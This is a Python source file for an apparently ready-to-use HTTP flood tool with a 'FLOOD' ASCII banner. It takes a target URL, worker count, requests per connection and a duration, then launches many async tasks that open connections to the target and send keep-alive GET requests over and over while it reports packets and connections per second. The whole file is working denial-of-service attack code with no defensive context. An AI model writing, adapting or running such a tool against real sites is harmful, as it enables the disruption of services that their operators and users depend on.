from asyncio import open_connection, create_task, Event, sleep, run
from yarl import URL
from sys import argv as args
from contextlib import suppress
import colorama
import sys
import os

pps, cps = 0, 0

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 0, 0)
end_color = (0, 0, 255)

async def flooder(target: URL, payload: bytes, event: Event, rpc: int = 100):
    global pps, cps
    await event.wait()

    while event.is_set():
        with suppress(Exception):
            r, w = await open_connection(target.host, target.port or 80, ssl=target.scheme == "https")
            cps += 1
            for _ in range(rpc):
                w.write(payload)
                await w.drain()
                pps += 1

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""
  █████▒██▓     ▒█████   ▒█████  ▓█████▄ 
▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
 ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
 ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ 
 ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ 
           ░  ░    ░ ░      ░ ░     ░    
                                  ░      
"""
    prints(start_color, end_color, banner)
    print("\n") 
    global pps, cps
    
    try:

        assert len(args) == 5, "python3 %s <target> <workers> <rpc> <timer>" % args[0]
        assert URL(args[1]) or None, "Invalid url"
        assert args[2].isdigit(), "Invalid workers integer"
        assert args[3].isdigit(), "Invalid connection pre seconds"
        assert args[4].isdigit(), "Invalid timer"
        
        target = URL(args[1])
        workers = int(args[2])
        rpc = int(args[3])
        timer = int(args[4])
        event = Event()

        payload = (
            f"GET {target.raw_path_qs} HTTP/1.1\r\n"
            f"Host: {target.raw_authority}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n").encode()

        event.clear()
        
        for _ in range(workers):
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
           
        event.set()
        print("Attack started to %s" % target.human_repr())

        while timer:
            pps, cps = 0, 0
            await sleep(1)
            timer -= 1
            print(f"PPS: {pps:,} | CPS: {cps:,} | Time Remaining: {timer:,}s")
        event.clear()
    except AssertionError as e:
        print(str(e) or repr(e))
        
run(main())
